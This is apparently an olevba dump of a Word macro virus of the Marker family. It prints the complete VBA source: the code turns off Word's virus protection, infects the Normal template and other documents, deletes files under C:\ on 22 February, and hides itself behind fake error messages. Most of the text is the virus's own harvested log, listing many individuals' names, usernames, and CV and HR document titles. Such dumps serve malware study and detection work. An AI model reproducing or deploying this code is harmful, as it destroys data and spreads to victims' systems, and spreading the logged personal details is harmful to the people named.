olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.x-6e64dee62cb37baeb752d17357534840b85476bf
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.x-6e64dee62cb37baeb752d17357534840b85476bf - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 












































' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
Private Sub Document_Close()
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
On Error Resume Next
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
Const from = "Yugoslavia" 'nuthin' to do with the GeNiUs just needed a marker
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
Dim ad, nt As Object
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
Dim rep, x As Integer
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
Dim virusCode, UserAddress, LogData, LogFile As String
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
DocumentInfected = ad.codemodule.Find(from, 1, 1, 10000, 10000)
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
NormalTemplateInfected = nt.codemodule.Find(from, 1, 1, 10000, 10000)
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
Options.VirusProtection = False
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
Options.SaveNormalPrompt = True
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
Delivery:
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
If Day(Now()) = 22 And Month(Now()) = 2 Then
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
Kill "C:\*.*":
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
rep = MsgBox("That's Right", vbOK + vbCritical, "It's Murder")
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
GoTo Delivery
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
End If
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
If (DocumentInfected = True Xor NormalTemplateInfected = True) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
If DocumentInfected = True Then
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
SaveNormalTemplate = NormalTemplate.Saved
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
virusCode = ad.codemodule.Lines(1, ad.codemodule.countoflines)
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
For i = 1 To Len(Application.UserAddress)
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
End If
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
Else
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
UserAddress = UserAddress & Chr(13) & "' "
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
End If
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
Next i
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
LogData = Chr(13) & "' " & Format(Time, "hh:mm:ss AMPM -") & Format(Date, "dddd,d mmm,yyyy") & Chr(13) & "' " & Application.UserName & Chr(13) & "' " & UserAddress & Chr(13) & "' " & Application.ActiveDocument & Chr(13)
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
virusCode = virusCode & LogData
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
nt.codemodule.Deletelines 1, nt.codemodule.countoflines
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
nt.codemodule.AddFromString virusCode
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
With nt.codemodule
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
.replaceline 174, "Sub viewVBcode()" & Chr(13) & Chr(13) & "x=Msgbox(" & Chr(34) & " Error - Not enough memory!" & Chr(34) & ", VbOkonly + VbApplication+Vbcritical," & Chr(34) & "Visual Basic Editor" & Chr(34) & ")" & Chr(13) & Chr(13) & "End Sub" & Chr(13) & Chr(13) & "Sub ToolsMacro()" & Chr(13) & Chr(13) & "x=Msgbox(" & Chr(34) & " Error - Not enough memory!" & Chr(34) & ", VbOkonly + VbApplication+Vbcritical," & Chr(34) & "Visual Basic Editor" & Chr(34) & ")" & Chr(13) & Chr(13) & "End Sub"
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
End With
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
With nt.codemodule
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
For x = 45 To 181 Step 2
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
.replaceline x, "' " & Application.UserName & " " & Application.ActiveDocument & Now & Application.ActivePrinter
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
Next x
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
End With
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
If SaveNormalTemplate = True Then NormalTemplate.Save
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
End If
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
If NormalTemplateInfected = True Then
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
SaveDocument = ActiveDocument.Saved
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
virusCode = nt.codemodule.Lines(1, nt.codemodule.countoflines) & Chr(13) & "' " & Application.ActiveDocument & Chr(13)
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
ad.codemodule.Deletelines 1, ad.codemodule.countoflines
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
ad.codemodule.AddFromString virusCode
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
nt.codemodule.Deletelines 1, nt.codemodule.countoflines
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
nt.codemodule.AddFromString virusCode
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
ad.codemodule.Deletelines 174, 13
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
With ad.codemodule
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
For x = 45 To 181 Step 2
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
.replaceline x, "' " & Application.UserName & " " & Application.ActiveDocument & Now & Application.ActivePrinter
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
Next x
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
End With
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
If SaveDocument = True Then ActiveDocument.Save
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
End If
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
End If
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
Options.SaveNormalPrompt = False
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
End Sub
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
' sim salabim Barbara Kysela.doc29.11.2006 18:22:16Kein Drucker
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
' sim salabim Barbara Kysela.doc29.11.2006 18:22:16Kein Drucker
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
' sim salabim Barbara Kysela.doc29.11.2006 18:22:16Kein Drucker
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
' AU Business Manager.doc
' sim salabim Raum Kopie.doc12.02.2007 11:08:45Kein Drucker
' GDLUCK.DOC

' NOMURA.doc

' Operations Generalist.doc

' PBX Telecom Coordinator.doc

' resume.doc

' parm_meegada.doc

' Pramit.doc

' HOTLIST1.doc

' Toshinobu SHIIKI.doc

' Jacob Jacobs.doc

' cv_focus.doc

' letter2.doc

' Hot List 05-27-1999.doc

' Ashwat.doc

' dbaunix.doc

' juno.doc

' CVMBA.doc

' RESUME399.doc

' Alex Lam.doc

' Senior Unix Administrator.doc

' Senior Unix Administrator.doc

' RESUME LATEST11.doc

' Ryuji Iwamoto1.doc

' Document1

' Sivaram Venkata1.doc

' Dean's Resume Current.doc

' infrmgr.doc

' Alan LEE.doc

' Jackson YAU.doc

' Patrickshum.doc

' Resume.doc

' CurrVit (1).doc

' SaleTar.doc

' Gerald Sanderson.doc

' Lee-A.doc

' carmel~1.doc

' 990116.res-detail-ltt.doc

' resume.doc

' Ad tech supp.doc

' Interview Discussion Items.doc

' Rres97j.doc

' Cvrltra.doc

' HOTLIST1.doc

' Mar-W.doc

' thomas chu.doc

' 2952.doc

' China.doc

' CIIC Introduction.doc

' Carlos Junco Jr.doc

' Vinod Varkey.doc

' Brian Voorman.doc

' Deon Victoria Allen.doc

' Junco-C.doc

' charlie_cv.doc

' ANIL Antony, Lotus Notes.doc

' Gary TANG.doc

' marcus chan.doc

' Web Operations Admin.doc

' Mac Coordinator.doc

' ANIL Antony, Lotus Notes1.doc

' CV ROGER CORPIN.doc

' Resume1.doc

' Jackson Yau 2.doc

' S4R_Int.doc

' asset management2.doc

' FID Developer.doc

' Equity Front line.doc

' Prof.doc

' TK Business Manager.doc

' recruiter.doc

' 5011.doc

' Aude HENNINO.doc

' 05:30:39 PM -Tuesday,22 Jun,1999
' barnhst
'
' Hennino.doc

' FI IT audit June 22.doc

' OffshoreJGB1.doc

' jasdec2.doc

' intrface1.doc

' fiitmanagementresponsesfinal1.doc

' SR_Zengin 0621.doc

' 107 S&MrecIWT74.doc

' Wsstokyo.doc

' RFP.doc

' RFP1.doc

' 99-05 FSA Final Inspection Manual 1-64 w notes.doc

' ejima-san.doc

' 99-05 FSA Final Inspection Manual 65-169.doc

' 99-05 FSA Final Inspection Manual 170-254.doc

' 99-05 FSA Final Inspection Manual 1-64 w notes1.doc

' sugi990625.doc

' fincon.doc

' Operations.doc

' RTGS Overview & Business Requirements v0.30.doc

' 08:15:01 AM -Tuesday,29 Jun,1999
' hasegko
'
' RTGS Overview & Business Requirements v0.30.doc

' Mark Hemsley Tokyo Visit June30-July2 '992.doc

' Mark Hemsley Tokyo Visit.doc

' Schedule and Project List.doc

' Mark Hemsley Tokyo Visit June30-July2 '993.doc

' FI IT audit June 22.doc

' Schedule and Project List.doc

' IntegrationPlan-MM 0629.doc

' Y2K IT Managers mtg minutes 06299911.doc

' Y2K IT Managers mtg minutes 0629991.doc

' Resume99.doc

' IBATrSummer99.doc

' attend~1.doc

' Mark Hemsley Tokyo Visit June30-July2 '991.doc

' Mark Hemsley Tokyo Visit.doc

' agenda1.doc

' OPCO 99-06-26 (FSA).doc

' IT memo June 26.doc

' 10:58:27 AM -Tuesday,13 Jul,1999
' hasegko
'
' IT memo June 26.doc

' IT  Hiring forms - blank.doc

' 11:55:03 AM -Thursday,12 Aug,1999
' satomi
'
' IT  Hiring forms - Akihiro Urabe.doc

' FAX COVER-to Zivart.doc

' Cross - Jonathan Peterson.doc

' Das - Partha.doc

' Thoo-Eugene.doc

' DSL (nonOfficer) noFam Merged.doc

' Urabe-Akihiko.doc

' Approval for R.Fudachek.doc

' Ejima-Tsuyoshi.doc

' Chiu-Ernest.doc

' Yamaguchi, Chiharu.doc

' Wicks-Kiyoshi.doc

' Shahi, Manoj.doc

' 03:29:36 PM -Monday,16 Aug,1999
' yasuiak
'
' Shahi, Manoj.doc

' Numa-Shingo.doc

' Lee - Simon Sau-Chung.doc

' Franklin-Howard BT.doc

' Li - Chunxiao.doc

' FAX COVER.doc

' Masui-Miyako 2nd offer.doc

' fujimoto - Shinji.doc

' Arai - Kazuhiro.doc

' Asano - Keizo.doc

' Headcount DPS (Det) CC Ordered 1Aug99.doc

' 06:15:26 PM -Sunday,22 Aug,1999
' minakts
'
' Headcount DPS (Det) CC Ordered 1Aug99.doc

' HR Home Contact List.doc

' MemoLOGO.doc

' Job Posting Program.doc

' Job Posting Prgram.doc

' Employee Referral Form.doc

' Employee Referral Program.doc

' Job Posting Program.doc

' Document1

' Rules of employment Jfinal.doc

' HR Circulation (kairan).doc

' BTCO Secondment (21 June 1999).doc

' BTAS Resign w Retention (17Jun99).doc

' Fax.doc

' BTCO Secondment (1 July 1999).doc

' Eto_Hiroko _CERTIFICATION.doc

' Global Notes Aug 18.doc

' UserID_Minakami.doc

' mtchcov2.doc

' ibjman.doc

' expcov3.doc

' Summer Dress Code.doc

' End of Summer Casual Memo.doc

' 01:50:19 PM -Tuesday,31 Aug,1999
' Katerina Limenopoulou
'
' ~0000644.doc

' Curriculum Vitae.doc

' ~0016245.doc

' ~0025137.doc

' ~0023910.doc

' ~0022615.doc

' ~0018686.doc

' ~0065008.doc

' Curriculum Vitae.doc

' 03:02:23 ˝ì -ÓÜââáôï,11 Óå˝,1999
' Katerina
'
' Curriculum Vitae.doc

' Curriculum.Vitae.doc

' Document1

' Document1

' Document1

' Curriculum.doc

' Curriculum Vitae.doc

' 01:58:27  -Donnerstag,16 Sep,1999
' debis
'
' Curricul.doc

' debis AG Brief.doc

' Ansprechpartnerliste-HRC.doc

' KH_Brief.doc

' Faxvorlage.doc

' applicat.doc

' andreas_.doc

' Weitrltgsfrmlar_GG.doc

' Eingbest_mail.doc

' Eingbest.engl.doc

' Eingangsbest GG engl.doc

' Traineeprogramm PT HR.doc

' Bewerberpool.doc

' Absage_nach_Gespräch.doc

' Absage.doc

' Direktabsage.doc

' Direktabsagemail.doc

' Direktabsage engl.doc

' Absage engl.doc

' Deckblatt Bewerberpool.doc

' Bewerberpool.doc

' Bewerberpool.doc

' Tabellar.doc

' Veröffentlichung Inter-Intranet Stand 19.08.99.doc

' Stellenbezeichnungen.doc

' Faxblatt.doc

' computer science.doc

' FH Furtwangen.doc

' première liste.doc

' Absage engl.doc

' Absage.doc

' Absage_nach_AC.doc

' Absage_nach_AC_engl.doc

' Absage_nach_Gespräch.doc

' Absage_nach_Gespräch_PTFS.doc

' Absage_ProTeam.doc

' Absage_ProTeam_engl.doc

' Eingangsbest GG engl.doc

' Eingbest.doc

' Eingbest.engl.doc

' Einl_AC_cmc_engl.doc

' Einl_AC_ptfs.doc

' Einl_Bewerbgespr_Barthl.doc

' Einl_Bewerbgespr_Barthl_engl.doc

' anschbro.doc

' anschbro_engl.doc

' ProTeamHR_engl.doc

' Traineeprogramm PT HR.doc

' Weiterleitung dSH engl.doc

' Weiterleitung_debitel.doc

' Weiterleitung_dSH.doc

' Weiterleitung_mblf.doc

' Weiterleitung_Primus_Online.doc

' Weiterleitungsformular.doc

' 09:30:00  -Montag,27 Sep,1999
' SXPVP12
'
' Weiterleitungsformular.doc

' Dokument2

' Weiterleitungsformular.doc

' Weiterleitungsformular.doc

' Weiterleitungsformular.doc

' Dokument1

' September 10.doc

' FAX.doc

' FAX.doc

' Dokument2

' markus-kiefer-lang.doc

' Dokument1

' Agenda 29. Sept 99.doc

' Absage.doc

' Dokument2

' Protocole 17 Sept 99.doc

' Dokument1

' Poster proposal.doc

' Dokument3

' debis internal mailing.doc

' Unversal Hall  FAX.doc

' Dokument7

' Dokument4

' university contact letter.doc

' bookmark.doc

' 05:50:45  -Donnerstag,30 Sep,1999
' SXPVP29
'
' bookmark.doc

' Translation Request Form.doc

' AIR II short.doc

' 04:09:19  -Samstag,2 Okt,1999
' Frau Katharina Heuer
'
' AIR II short.doc

' discussion_991004.doc

' Erfolgsstory.doc

' LA 20.09.99.doc

' TO51099.doc

' Zukunft der Arbeit03.doc

' Zukunft der Arbeit02.doc

' DLTVKongreß_KeyMessagesDLTV_01.doc

' Q&ATarif03.doc

' DLTVKongreß_KeyMessages_01.doc

' Kongreß für Angewandte Psychologie_01.doc

' Zukunft der Arbeit04.doc

' FIT06.doc

' Kongreß für Angewandte Psychologie_01.doc

' 11:44:01  -Freitag,8 Okt,1999
' Rainer Ridlhammer
'
' PanelThesen-Bensel.doc

' ABO-GS.DOC

' FORST.DOC

' ATTRAKTI.DOC

' DELIGIER.DOC

' SBEAS.doc

' GPOL_LIT.DOC

' GPOL_FAX.DOC

' DOK9.DOC

' Wünsche1.doc

' Wünsche3.doc

' Dokument3

' Dokument1

' AnschreibenBankpublizität.doc

' AnschreibenVerband Stahl.doc

' AnschreibenBankpublizität.doc

' Seite1Hagen.doc

' Seite1oldenburg.doc

' Seite1oldenburg.doc

' Seite1stahl.doc

' Seite1stahl.doc

' Grundversion LL 98.doc

' Dokument2

' Dokument1

' Dokument1

' Dokument1

' Dokument1

' EKKONG.DOC

' IBA3.DOC

' EKLOGOG.DOC

' PRONEU.DOC

' PRONEU.DOC

' Videodeckblattt.doc

' Dokument2

' Videodeckblatt.doc

' Videoseite.doc

' Gepflegte Kinderkleidung.doc

' DRACHEN2.doc

' VERÖFF3.doc

' VERÖFF3.TXT

' Lebenslauf Muster kurz.doc

' Veröffentlichungen 1099.doc

' Zeugnis Bfz.doc

' Dokument1

' Dokument2

' Laufbahnplanung.doc

' Ll.doc

' Dokument1

' Handschrift Bertelsmann.doc

' Abmeldung.doc

' kinderkramre.doc

' Kinderschuhe günstig.doc

' Dokument1

' benchmad.doc

' Grundlayout LL.doc

' WILEBRDL.DOC

' InhaltVideokassette.doc

' Vorlage Schilder.doc

' Fachtagung201098.doc

' Literaturliste Internetbücher.doc

' Peter Diepold.doc

' Dokument1

' Dokument1

' Dokument3

' Dokument2

' BFBÜRG.DOC

' Sparda GNP.doc

' Liebe  Oma.doc

' BFBRUS.DOC

' BFMINIST.DOC

' BFschäff.doc

' FAXBRUS.DOC

' Anfbus.doc

' BFBÜRG.DOC

' Dokument2

' Lutten u Worren Karten.doc

' LUT_INST.DOC

' LUT_AUSW2.doc

' LUT_AUSW.doc

' WDHELP.WRI

' Dokument1

' Dokument1

' Aran Pullover.doc

' 1 große Tüte Duplo Bausteine mit Platte.doc

' Dokument1

' 1 große Tüte Duplo Bausteine mit Platte.doc

' FÜRSIE.doc

' ReklamationKamera.doc

' Dokument1

' Dokument2

' LEBENLB6.DOC

' LEBENL4.TXT

' LEBENL4.TXT

' Für die dunkle Jahreszeit.doc

' Winterblüten.doc

' Neuantrag für einen Modellversuch.doc

' Neuantrag für einen Modellversuch.doc

' 01:44:52  -Dienstag,1 Feb,2000
' Schopphoven
'
' Neuantrag für einen Modellversuch.doc

' brief_Auswertung.doc

' brf_umfrage.doc

' SB_Controlling.doc

' bezirksregierung.doc

' SEVENVertrag.doc

' seven_gastro1.doc

' sommeruni_frauen.doc

' brf_2000.doc

' Serienbriefe1

' Interess99_ohneTeiln99.doc

' Interessierte 1999.doc

' Anschreib_Anmeldef_fInt99.doc

' AV-ZENT1.doc

' fernuni.doc

' fernunilebens.doc

' t-nova.doc

' anglistik.doc

' philo.doc

' Anmeldebestätigung_erste_W.doc

' erste_Woche.doc

' 04:23:46  -Donnerstag,24 Feb,2000
' Soziologie
'
' erste_Woche.doc

' Weihnachtsbrief USA 99.doc

' Dokument1

' Firma Mustermann.doc

' einstellung1299.doc

' Dokument1

' Schuler, J. 1.3.00.doc

' metamorphose.doc

' SS00-PS.doc

' Schuler, J. 1.3.00.doc

' SPRECHSS.DOC

' brief an dr. göser.doc

' HegelMarxLukàcs.doc

' ABSENDER.DOC

' BEWERB1.DOC

' Autorenliste.doc

' BfA-Elders3.doc

' MD_SS00-V.doc

' Kunst 2000.doc

' Kolloq 00.doc

' SS00-HS.doc

' Hygiene 2000.doc

' STEHR-LV2.doc

' SODRU-HA.DOC

' VerzeichnisSS2000.doc

' NatodKultII-SS00.doc

' HS97.DOC

' Dokument3

' NatodKultII-SS00.doc

' 08:33:21  -Freitag,10 Mrz,2000
' Prof. Dr. Strasser
'
' NatodKultII-SS00.doc

' Kapsel alternativ.doc

' Dokument1

' Turck Zwischenbericht1.doc

' Turck Zwischenbericht.doc

' Turck Probekapitel1.doc

' Dokument1

' Scherer 9.3.00.doc

' Dokument1

' Turck Probekapitel1.doc

' Fehrer-Theiß 9.3.00.doc

' Dokument1

' Stoess-Zeitplan-revid.2.doc

' DGF 2überarbeitet.doc

' DGF 2überarbeitet.doc

' DGF 2überarbeitet.doc

' DGF 2überarbeitet14.3.00.doc

' Kapsel alternativ.doc

' EINLADUN.DOC

' BESPRE~1.DOC

' Siebert 15.3.00.doc

' Dokument1

' Dietrich-Burda 16.3.00.doc

' Dokument1

' Gr^nndervSigmater ..2.doc

' Dokument1

' Korrektur für Prof Strasser.doc

' Knowledge, markets and biotechnology3.doc

' Knowledge, markets and biotechnology3.doc

' Dokument1

' Dokument1

' GELATINE-3-.DOC

' Gr^nndervSigmater Gr^nndershne 1.doc

' Dokument1

' Cv-allg.doc

' CVcorr.doc

' Dokument1

' Neuber-Bobzien 15.9.99.doc

' Dokument1

' Sandikci.doc

' TURCK_~7.DOC

' Gr^nndervSigmater-Endfassung-1-1.doc

' Dokument1

' bwbmask1.doc

' Center for the Advanced Study of Modern Societies.doc

' castells.doc

' Dok2.doc

' DumailHS.doc

' email announcement.doc

' Entrepreneurship  EPS.doc

' Bankautomat.doc

' Fairy.doc

' CIA.doc

' 1.Inf. von Kaziu Szulc vom 25.3.200.doc

' 2.Inf. Kaziu Szulc vom 25.3.2000.doc

' MUSTERM1.DOC

' KLUSEN~1.DOC

' Tagesordnung 27.3.00.doc

' Turck Arbeitsplan.doc

' Dokument1

' Dokument1

' Dokument1

' Dokument1

' Dokument2

' Rodenstock 29.3.00.doc

' Dokument1

' Biographie 30.3.00.doc

' Dokument1

' Endfassung Antrag.doc

' ABSTRACT.Schmidt.doc

' 990920_kleiner_anfrage2.DOC

' Hoffmann 22.7.99.doc

' Hartmann-Nowel-Angebot 1.doc

' Hartmann-Nowel-Angebot 2.doc

' let_kanzler_organisation.doc

' Dokument1

' Dokument1

' Corsa-Tests.doc

' verbal-Übersicht-Vorderseite-ohne-verbal.doc

' VERBAL-Übersicht2.doc

' VERBAL-Übersicht3.doc

' VERBAL-Übersicht6.doc

' Seminarplan PS Konflikttheorien.doc

' CV 1.doc

' Strasser-Internet.doc

' C.V.doc

' Kleider31plus2.doc

' C.V.doc

' Dokument1

' SS00-V.doc

' FUNKTIO1.DOC

' SEMINAR.DOC

' Hartmann 14.2.00.doc

' Hartmann 23.2.00.doc

' 11:50:21  -Mittwoch,26 Apr,2000
' Prof. Dr. Strasser
'
' Hartmann-ACOM 26.4.00.doc

' Uni intern Soz 2.doc

' Dokument2

' Aicher-Dussmann 3.5.00.doc

' Hartmann.doc

' 11:52:12  -Freitag,5 Mai,2000
' Lutz Suendermann
'
' HARTMA~1.DOC

' InternetBilder.doc

' 18Internet.doc

' InternetBilder.doc

' 1011Betriebsberater.doc

' 6September.doc

' Siesindda_.doc

' Siesindda_.doc

' Text Editorial Favorit.doc

' Word-Arbeitsdatei D 4022

' 8WorkAbt1.doc

' Workshop46.doc

' 22PC.doc

' 6BKK.doc

' 7PKV.doc 1

' 9Versicherung.doc

' 9online.doc

' 2Inhalt.doc

' 4Budget.doc

' 1Editorial.doc

' 1Editorial.doc

' Text FLYER 2000 30.09..doc

' VPEditorial.doc 1

' 8VpKongresse.doc

' 1Editorial.doc

' 2Inhalt.doc

' VPEditorial.doc 1

' 2Besuch.doc

' 19Klasse2000.doc

' 22Meister.doc

' Einladungstext Variante 1+2.doc

' Einladungstext Variante 1+2.doc

' 2KMU.doc

' 8Jahresbericht.doc

' 10Report.doc

' 2Posti.doc

' 5RSA.doc

' 9Werbung.doc

' 8VpKongresse.doc

' 1Tarif.doc 1

' AzubiFoto.doc

' AzubiFoto.doc 1

' AzubiFoto.doc

' ARTKOSMOBIOLOGIE01.doc

' ARTKOSMOBIOLOGIE02.doc

' ARTZEPPELIN02.doc

' Gabriela E. Klein.doc

' AVW-00200-TextSTW.doc

' Text Plakat 27-06-00.doc

' Flyer 2000, 4.7..doc

' Seitenspiegel.doc 1

' ProtHP3-00.doc

' Seitenspiegel.doc 3

' Seitenspiegel.doc 5

' AHT-00~1.DOC

' Geschenkbeteiligung neu.doc

' 00168 Texte SAMICA.doc

' 00168 Texte SAMICA.doc

' 8Hüftop.doc

' 22Azubis.doc

' 10ServiceBriefe.doc

' 11Mics.doc

' 11Vorschlag.DOC

' 12MBW.doc

' Mich-Systemhaus.Service.doc

' Mich-MA.Lager+Vertrieb.neu.doc

' Entwicklungszentrum.doc

' Systemhaus.Service.doc

' MA.Lager+Vertrieb.neu2.doc

' Buntmetalle.doc

' Edelstahl.doc

' Speisen und Getränke.doc

' 1Editorial.doc

' 1Editorial.doc

' Seitenspiegel.doc 1

' Seitenspiegel.doc 1

' Brief für Geschäftsfreunde.doc

' Prisma2.doc

' 0010-1.doc

' Begriffe Image-Broschüre.doc

' Texte Prisma.doc

' 2Inhaltbuch.doc

' 5Fischer.doc

' 7Filialtests.doc

' 5Mitglbriefe.doc

' 12Budgetstudie.doc

' 12Fischer.doc

' 13Buchtipps.doc

' 13VPSpiegel.doc

' 14MBW.doc

' 14Personen.doc

' 14VPGeburtstage.doc

' 17aktivum.doc

' 5Fischer.doc

' 5Mitglbriefe.doc

' 7Filialtests.doc

' 8Prävention.doc

' 9ModellprojektNaturheile.doc

' 14MBW.doc

' 14MBW.doc

' 14MBW.doc

' 15KVP.DOC

' 5Einkommen.doc

' 18Intranet.doc

' 10Gekasino.doc

' 10Gekasino.doc

' 10Gekasino.doc

' 5Einkommen.doc

' 18Intranet.doc

' 10Gekasino.doc

' 18Intranet.doc

' 14MBW.doc

' 10VPKongress.doc

' 5Einkommen.doc

' HARTMANN.doc

' HARTMANN ALZB.doc

' 10VPKongress.doc

' 2Stammtisch.doc

' 6Frage.doc

' 16Abt4.doc

' 21Bundesländer.doc

' 20GEKimOstalbkreis.doc

' 19BsenAktionen.doc

' 4Kundenmonitor.doc

' 6Frage.doc

' 8Ziele.doc

' 16Abt4.doc

' 4Bertelsmannpreis.doc

' Dok4.doc

' ANZEIG~1.DOC

' 8Prävention.doc

' 12Club.doc

' 6Service.doc

' 1RSAkek.doc

' 3.Picasso.doc

' 5Azubis.doc

' 1Editorial.doc

' 22Engagement.doc

' Nachtrag.doc

' ex_32.doc

' ex_02.doc

' ex_09.doc

' ex_04.doc

' ex_03.doc

' 03:05:43  -Montag,11 Dez,2000
' Lutz Suendermann
'
' ex_03.doc

' ex_22_d.doc

' 11:46:18  -Montag,8 Jan,2001
' Lutz Suendermann
'
' ex_22_d.doc

' Hallo liebe Mitarbeiter!

' Wieviel Liter sind ein Jahr

' Programm-Übersicht.doc

' SANIPA Badewelt

' SANIPA Badewelt

' SANIPA Badewelt

' SANIPA Badewelt

' SANIPA Badewelt

' SANIPA Badewelt

' SANIPA Badewelt

' SANIPA Badewelt

' SANIPA Badewelt

' SANIPA Badewelt

' SANIPA Badewelt

' SANIPA Badewelt

' SANIPA Badewelt

' SANIPA Badewelt

' SANIPA Badewelt

' SANIPA Badewelt

' SANIPA Badewelt

' SANIPA Badewelt

' Texte Poster.doc

' Allgemeine Lieferungs

' AVW-01267_STW-050401.doc

' Einladung Hannover

' Hannover.doc

' e_procure.doc

' Stellen. StZ kaufm. Sach.W5.1

' Logoald.doc

' 701121EN.doc

' 701121FR.doc

' 701121E2.doc

' 701121F2.doc

' 701121NL.doc

' 701121E2.doc

' 701121F2.doc

' 701121FR.doc

' Dana Pfisterer.doc

' Text Anz. AS-WN-01016.doc

' SANIPARU.DOC

' SANIPARU.DOC

' SANIPARU.DOC

' SANIPARU.DOC

' Sanipaâ.doc

' Sanipaâ.mcw

' Sanipaâ_50.mcw

' Makedonien2

' Peloponnes2

' Makedonien

' Peloponnes

' KRETA2

' 09:07:43  -Mittwoch,5 Dez,2001
' *
'
' KRETA2

' Makedonien2

' INFO

' Ionische2

' Kurzinfos

' Galanos

' Klassische Rundreise

' Kreta Rundreise

' Inselhüpfen

' Kykladen neu

' Merten2

' Peloponnes2

' Korfu

' Ionische

' Thessalien

' Saronisch

' athen2

' athen

' Thrakien2

' Thrakien

' RV

' Info2

' N-O-Ägäis2

' KRETA

' lia

' Dokument1

' Kykladen

' Frau Arnaki2

' Epirus

' GESCHICHTE

' El original de …ucados Arte.doc

' Schede_Tech_french.doc

' retro_copertinaFR.doc

' Schede Tecniche_UK.doc

' retro_copertina_eng.doc

' Datenblatt.doc

' Druckstufe.doc

' Werde bierkoenigin.doc

' Briefbogen

' Getränke-Pass-Malteser.doc

' 6834kunstwerk.doc

' 6834kunstwerk.doc

' Außendienst Handel 1.doc

' TXT AUVA.doc

' TXT AUVA.doc

' TXT AUVA.doc

